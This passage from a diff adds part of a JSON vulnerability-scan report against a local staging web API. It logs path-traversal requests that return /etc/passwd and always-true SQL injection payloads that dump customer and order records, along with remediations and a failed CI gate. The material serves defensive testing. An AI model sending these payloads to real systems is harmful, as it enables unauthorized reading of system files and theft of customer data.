+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 7
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:28.005619+03:00"
+    },
+    {
+      "id": "acme-path-traversal",
+      "name": "Path Traversal in document name",
+      "severity": "critical",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/documents/open?name=..%2F..%2F..%2Fetc%2Fpasswd",
+      "method": "GET",
+      "template": "acme-path-traversal",
+      "description": "A ../ sequence in a document name returned /etc/passwd.",
+      "remediation": "Reduce names with Path.GetFileName or normalize with Path.GetFullPath and verify the result stays under the document root.",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021-Broken Access Control",
+      "tags": [
+        "traversal",
+        "lfi"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "root:.*:0:0:"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/raw?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 5
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/preview?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 500,
+            "response_headers": {
+              "Content-Length": "0",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "duration_ms": 11
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/view?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 400,
+            "response_headers": {
+              "Content-Type": "application/problem+json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "{\"type\":\"https://tools.ietf.org/html/rfc9110#section-15.5.1\",\"title\":\"Bad Request\",\"status\":400,\"traceId\":\"00-a1eedf6d7350cba6d6c06ccc7f527667-cf467ad63dee49b4-00\"}",
+            "duration_ms": 18
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/legacy?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 3
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/download?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "application/octet-stream",
+              "Date": "Fri, 02 Oct 2026 21:53:27 GMT",
+              "Last-Modified": "Fri, 02 Oct 2026 18:59:09 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 7
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/documents/open?name=..%2F..%2F..%2Fetc%2Fpasswd",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Length": "923",
+              "Content-Type": "text/plain",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\napp:x:1654:1654::/home/app:/bin/sh\n",
+            "duration_ms": 3
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:28.101955+03:00"
+    },
+    {
+      "id": "acme-sqli-boolean-customers",
+      "name": "SQL Injection (Boolean, customer data)",
+      "severity": "high",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/customers/by-name?name=x%27%20OR%20%271%27%3D%271",
+      "method": "GET",
+      "template": "acme-sqli-boolean-customers",
+      "description": "An always-true SQL predicate in a query parameter returned every customer record.",
+      "remediation": "Use parameterized queries; never concatenate request values into SQL text.",
+      "cwe": "CWE-89",
+      "owasp": "A03:2021-Injection",
+      "tags": [
+        "sqli",
+        "injection"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "status:200",
+          "ben@example.test",
+          "chloe@example.test"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/customers/by-name?name=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":1,\"name\":\"Ana Popescu\",\"email\":\"ana@example.test\"},{\"id\":2,\"name\":\"Ben Carter\",\"email\":\"ben@example.test\"},{\"id\":3,\"name\":\"Chloe Martin\",\"email\":\"chloe@example.test\"}]",
+            "duration_ms": 7
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:28.206504+03:00"
+    },
+    {
+      "id": "acme-sqli-boolean-customers",
+      "name": "SQL Injection (Boolean, customer data)",
+      "severity": "high",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/customers/emails?region=x%27%20OR%20%271%27%3D%271",
+      "method": "GET",
+      "template": "acme-sqli-boolean-customers",
+      "description": "An always-true SQL predicate in a query parameter returned every customer record.",
+      "remediation": "Use parameterized queries; never concatenate request values into SQL text.",
+      "cwe": "CWE-89",
+      "owasp": "A03:2021-Injection",
+      "tags": [
+        "sqli",
+        "injection"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "status:200",
+          "ben@example.test",
+          "chloe@example.test"
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/customers/by-name?name=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":1,\"name\":\"Ana Popescu\",\"email\":\"ana@example.test\"},{\"id\":2,\"name\":\"Ben Carter\",\"email\":\"ben@example.test\"},{\"id\":3,\"name\":\"Chloe Martin\",\"email\":\"chloe@example.test\"}]",
+            "duration_ms": 7
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/customers/by-email?email=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[]",
+            "duration_ms": 3
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/customers/emails?region=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[\"ana@example.test\",\"ben@example.test\",\"chloe@example.test\"]",
+            "duration_ms": 16
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:28.415189+03:00"
+    },
+    {
+      "id": "acme-sqli-boolean",
+      "name": "SQL Injection (Boolean, always-true predicate)",
+      "severity": "high",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/orders/search?status=x%27%20OR%20%271%27%3D%271",
+      "method": "GET",
+      "template": "acme-sqli-boolean",
+      "description": "An always-true SQL predicate in a query parameter returned rows that a literal match could not return, so the parameter is evaluated as SQL.",
+      "remediation": "Use parameterized queries; never concatenate request values into SQL text.",
+      "cwe": "CWE-89",
+      "owasp": "A03:2021-Injection",
+      "tags": [
+        "sqli",
+        "injection"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "status:200",
+          "\"cancelled\"",
+          "\"pending\""
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/search?status=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":100,\"status\":\"shipped\",\"total\":42.5},{\"id\":101,\"status\":\"pending\",\"total\":12},{\"id\":102,\"status\":\"cancelled\",\"total\":99.99},{\"id\":103,\"status\":\"shipped\",\"total\":7.25}]",
+            "duration_ms": 9
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:28.508377+03:00"
+    },
+    {
+      "id": "acme-sqli-boolean",
+      "name": "SQL Injection (Boolean, always-true predicate)",
+      "severity": "high",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/orders/by-reference?reference=x%27%20OR%20%271%27%3D%271",
+      "method": "GET",
+      "template": "acme-sqli-boolean",
+      "description": "An always-true SQL predicate in a query parameter returned rows that a literal match could not return, so the parameter is evaluated as SQL.",
+      "remediation": "Use parameterized queries; never concatenate request values into SQL text.",
+      "cwe": "CWE-89",
+      "owasp": "A03:2021-Injection",
+      "tags": [
+        "sqli",
+        "injection"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "status:200",
+          "\"cancelled\"",
+          "\"pending\""
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/search?status=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":100,\"status\":\"shipped\",\"total\":42.5},{\"id\":101,\"status\":\"pending\",\"total\":12},{\"id\":102,\"status\":\"cancelled\",\"total\":99.99},{\"id\":103,\"status\":\"shipped\",\"total\":7.25}]",
+            "duration_ms": 9
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/by-status?status=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[]",
+            "duration_ms": 4
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/by-reference?reference=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":100,\"status\":\"shipped\",\"total\":42.5},{\"id\":101,\"status\":\"pending\",\"total\":12},{\"id\":102,\"status\":\"cancelled\",\"total\":99.99},{\"id\":103,\"status\":\"shipped\",\"total\":7.25}]",
+            "duration_ms": 3
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:28.701354+03:00"
+    },
+    {
+      "id": "acme-sqli-boolean",
+      "name": "SQL Injection (Boolean, always-true predicate)",
+      "severity": "high",
+      "confidence": 1,
+      "environment": "staging-local",
+      "target": "http://127.0.0.1:18080",
+      "endpoint": "/api/orders/lookup?term=%25%27%20OR%201%3D1%20--",
+      "method": "GET",
+      "template": "acme-sqli-boolean",
+      "description": "An always-true SQL predicate in a query parameter returned rows that a literal match could not return, so the parameter is evaluated as SQL.",
+      "remediation": "Use parameterized queries; never concatenate request values into SQL text.",
+      "cwe": "CWE-89",
+      "owasp": "A03:2021-Injection",
+      "tags": [
+        "sqli",
+        "injection"
+      ],
+      "evidence": {
+        "description": "Template matched, indicating the condition it tests for is present.",
+        "matched_on": [
+          "status:200",
+          "\"cancelled\"",
+          "\"pending\""
+        ],
+        "extracted_vars": {
+          "BaseURL": "http://127.0.0.1:18080"
+        },
+        "exchanges": [
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/search?status=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":100,\"status\":\"shipped\",\"total\":42.5},{\"id\":101,\"status\":\"pending\",\"total\":12},{\"id\":102,\"status\":\"cancelled\",\"total\":99.99},{\"id\":103,\"status\":\"shipped\",\"total\":7.25}]",
+            "duration_ms": 9
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/by-status?status=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[]",
+            "duration_ms": 4
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/by-reference?reference=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":100,\"status\":\"shipped\",\"total\":42.5},{\"id\":101,\"status\":\"pending\",\"total\":12},{\"id\":102,\"status\":\"cancelled\",\"total\":99.99},{\"id\":103,\"status\":\"shipped\",\"total\":7.25}]",
+            "duration_ms": 3
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/customers/by-region?region=x%27%20OR%20%271%27%3D%271",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":1,\"name\":\"Ana Popescu\"},{\"id\":2,\"name\":\"Ben Carter\"},{\"id\":3,\"name\":\"Chloe Martin\"}]",
+            "duration_ms": 2
+          },
+          {
+            "method": "GET",
+            "url": "http://127.0.0.1:18080/api/orders/lookup?term=%25%27%20OR%201%3D1%20--",
+            "status_code": 200,
+            "response_headers": {
+              "Content-Type": "application/json; charset=utf-8",
+              "Date": "Fri, 02 Oct 2026 21:53:28 GMT",
+              "Server": "Kestrel"
+            },
+            "response_body": "[{\"id\":100,\"status\":\"shipped\"},{\"id\":101,\"status\":\"pending\"},{\"id\":102,\"status\":\"cancelled\"},{\"id\":103,\"status\":\"shipped\"}]",
+            "duration_ms": 2
+          }
+        ]
+      },
+      "timestamp": "2026-10-03T00:53:28.901403+03:00"
+    }
+  ],
+  "summary": {
+    "critical": 4,
+    "high": 5,
+    "medium": 7,
+    "low": 2,
+    "info": 1
+  },
+  "fail_on": "critical",
+  "gate_passed": false,
+  "exit_code": 1
+}
